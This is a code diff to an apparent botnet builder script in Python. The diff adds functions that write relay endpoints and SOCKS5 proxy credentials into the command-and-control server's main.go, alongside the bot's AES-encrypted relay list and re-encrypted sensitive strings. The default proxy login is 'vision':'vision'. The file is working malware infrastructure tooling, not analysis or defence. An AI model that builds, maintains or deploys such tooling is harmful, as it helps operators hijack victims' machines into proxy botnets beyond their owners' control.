@@ -590,6 +590,41 @@ def update_relay_config(base_path: str, magic_code: str):
         f.write(content)
 
 
+def update_cnc_relay_endpoints(cnc_path: str, relay_endpoints: list):
+    """Patch baked-in relay endpoints into cnc/main.go so the web panel can list them."""
+    main_go = os.path.join(cnc_path, "main.go")
+    with open(main_go, "r") as f:
+        content = f.read()
+    # Comma-separated host:port list (or empty string)
+    value = ",".join(relay_endpoints) if relay_endpoints else ""
+    content = re.sub(
+        r'var bakedRelayEndpoints\s*=\s*"[^"]*"',
+        f'var bakedRelayEndpoints = "{value}"',
+        content,
+    )
+    with open(main_go, "w") as f:
+        f.write(content)
+
+
+def update_cnc_proxy_credentials(cnc_path: str, proxy_user: str, proxy_pass: str):
+    """Patch default SOCKS5 proxy credentials into cnc/main.go for web panel pre-fill."""
+    main_go = os.path.join(cnc_path, "main.go")
+    with open(main_go, "r") as f:
+        content = f.read()
+    content = re.sub(
+        r'var bakedProxyUser\s*=\s*"[^"]*"',
+        f'var bakedProxyUser = "{proxy_user}"',
+        content,
+    )
+    content = re.sub(
+        r'var bakedProxyPass\s*=\s*"[^"]*"',
+        f'var bakedProxyPass = "{proxy_pass}"',
+        content,
+    )
+    with open(main_go, "w") as f:
+        f.write(content)
+
+
 def update_relay_endpoints(bot_path: str, enc_hex: str):
     """Update the relay endpoints encrypted blob in bot/config.go"""
     config_go_path = os.path.join(bot_path, "config.go")
@@ -1183,20 +1218,25 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     else:
         warning("Failed to set debug mode")
 
-    # Update relay endpoints
+    # Update relay endpoints (bot + CNC)
     if config.get("relay_endpoints"):
         relay_blob = "\x00".join(config["relay_endpoints"])
         enc_relay = aes_ctr_encrypt(relay_blob)
         update_relay_endpoints(bot_path, enc_relay)
+        update_cnc_relay_endpoints(cnc_path, config["relay_endpoints"])
         success(f"Relay endpoints configured ({len(config['relay_endpoints'])} endpoint(s))")
     else:
         # Clear relay endpoints (empty blob)
         update_relay_endpoints(bot_path, "")
+        update_cnc_relay_endpoints(cnc_path, [])
         info("No relay endpoints configured")
 
-    # Update default proxy credentials
+    # Update default proxy credentials (bot + CNC)
     update_proxy_credentials(
         bot_path, config.get("proxy_user", "vision"), config.get("proxy_pass", "vision")
+    )
+    update_cnc_proxy_credentials(
+        cnc_path, config.get("proxy_user", "vision"), config.get("proxy_pass", "vision")
     )
     success(f"Proxy credentials: {config.get('proxy_user', 'vision')}:{config.get('proxy_pass', 'vision')}")
 
@@ -1488,22 +1528,25 @@ def run_relay_update(base_path: str, cnc_path: str, bot_path: str):
     encrypt_config_blobs(config_go_path, old_key, new_key)
     success("Sensitive string blobs re-encrypted")
 
-    # Patch relay endpoints
+    # Patch relay endpoints (bot + CNC)
     if relay_endpoints:
         relay_blob = "\x00".join(relay_endpoints)
         enc_relay = aes_ctr_encrypt(relay_blob)
         update_relay_endpoints(bot_path, enc_relay)
+        update_cnc_relay_endpoints(cnc_path, relay_endpoints)
         success(f"Relay endpoints encrypted ({len(relay_endpoints)} endpoint(s))")
     else:
         update_relay_endpoints(bot_path, "")
+        update_cnc_relay_endpoints(cnc_path, [])
         info("Relay endpoints cleared")
 
     # Patch relay binary auth key
     update_relay_config(base_path, existing["magic_code"])
     success("Relay auth key synced")
 
-    # Patch proxy credentials
+    # Patch proxy credentials (bot + CNC)
     update_proxy_credentials(bot_path, proxy_user, proxy_pass)
+    update_cnc_proxy_credentials(cnc_path, proxy_user, proxy_pass)
     success(f"Proxy credentials: {proxy_user}:{proxy_pass}")
 
     # Offer to rebuild
